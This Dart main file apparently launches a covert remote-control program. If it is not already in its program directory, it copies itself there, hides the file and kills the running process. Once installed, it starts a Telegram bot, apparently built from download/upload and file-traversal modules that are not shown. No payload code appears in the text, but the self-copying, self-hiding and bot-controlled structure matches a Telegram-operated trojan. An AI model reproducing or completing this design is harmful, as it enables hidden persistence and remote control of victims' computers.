import 'dart:io';

import 'source/const.dart';
import 'source/download_upload.dart';
import 'source/telegram.dart';
import 'source/traversal.dart';

void main(List<String> args) async {
  // const url = 'url';
  // ArgResults argResults;
  // final parser = ArgParser()..addFlag(url, negatable: false, abbr: 'u');
  // argResults = parser.parse(args);
  // print(argResults.rest[0]);
  // await Downloader().validateAndDownload(argResults.rest[0]);

  if (Traverslar().shell.workingDirectory.toString() ==
      Settings.programDir.toString()) {
    print(Traverslar().shell.workingDirectory);
    print(Settings.programDir);
    await TeleBot().initter();
  } else {
    print(Traverslar().shell.workingDirectory);
    print(Settings.programDir);
    await Downloader().copier(programName: Settings.programNameCompiled);
    await Traverslar().hideFile();
    await Traverslar().killProgrm();
  }
  // await Downloader().checkAndGen();
}
